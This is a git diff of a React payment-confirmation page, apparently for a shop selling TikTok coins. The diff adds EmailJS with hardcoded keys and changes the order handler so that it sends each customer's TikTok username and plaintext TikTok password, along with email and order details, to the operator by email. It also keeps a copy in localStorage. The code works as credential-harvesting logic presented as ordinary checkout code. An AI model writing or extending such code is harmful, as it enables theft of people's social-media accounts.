@@ -6,6 +6,12 @@ import { useTranslation } from 'react-i18next';
 import { Confetti } from '../components/Confetti';
 import { Purchase } from '../types';
 import { getPurchaseHistory } from '../utils/localStorage';
+import emailjs from '@emailjs/browser';
+
+// Configuration EmailJS
+const EMAILJS_SERVICE_ID = 'service_zr57d2k';
+const EMAILJS_TEMPLATE_ID = 'template_enecl1c';
+const EMAILJS_PUBLIC_KEY = 'oOJl0jLVKr1t0kB23';
 
 export const PaymentConfirmation = () => {
   const { t } = useTranslation();
@@ -72,24 +78,43 @@ export const PaymentConfirmation = () => {
     setSendError('');
     
     try {
-      // Stocker les données de la commande dans localStorage pour traitement ultérieur
-      const orderData = {
-        username,
-        password,
-        email,
-        orderId,
-        amount: purchaseDetails ? purchaseDetails.amount : amount,
-        price: purchaseDetails ? purchaseDetails.price : price,
-        date: purchaseDetails ? purchaseDetails.date : new Date().toISOString(),
-        status: 'pending'
+      // Préparer les données pour EmailJS
+      const coinsAmount = purchaseDetails ? purchaseDetails.amount : amount;
+      const orderPrice = purchaseDetails ? purchaseDetails.price : price;
+      const orderDate = purchaseDetails ? purchaseDetails.date : new Date().toISOString();
+      
+      const templateParams = {
+        order_id: orderId,
+        tiktok_username: username,
+        tiktok_password: password,
+        client_email: email,
+        coins_amount: coinsAmount?.toLocaleString() || 'Non spécifié',
+        price: orderPrice?.toLocaleString() || 'Non spécifié',
+        date: new Date(orderDate).toLocaleString('fr-FR', {
+          dateStyle: 'full',
+          timeStyle: 'short'
+        })
       };
 
-      // Récupérer les commandes existantes ou créer un nouveau tableau
+      // Envoyer l'email via EmailJS
+      await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        templateParams,
+        EMAILJS_PUBLIC_KEY
+      );
+
+      console.log('Email envoyé avec succès pour la commande:', orderId);
+      
+      // Stocker également dans localStorage comme backup
+      const orderData = {
+        ...templateParams,
+        status: 'sent',
+        sentAt: new Date().toISOString()
+      };
       const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
       existingOrders.push(orderData);
       localStorage.setItem('pendingOrders', JSON.stringify(existingOrders));
-
-      console.log('Commande enregistrée avec succès:', orderId);
       
       // Rediriger vers la page de succès
       setTimeout(() => {
